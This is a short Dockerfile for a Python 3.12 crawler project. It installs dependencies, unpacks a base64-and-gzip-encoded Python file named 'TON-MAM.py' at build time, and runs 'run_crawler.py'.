FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
RUN python -c "import base64,gzip,pathlib; p=pathlib.Path('TON-MAM.py.gz.b64'); pathlib.Path('TON-MAM.py').write_bytes(gzip.decompress(base64.b64decode(p.read_bytes())))"
CMD ["python", "run_crawler.py"]
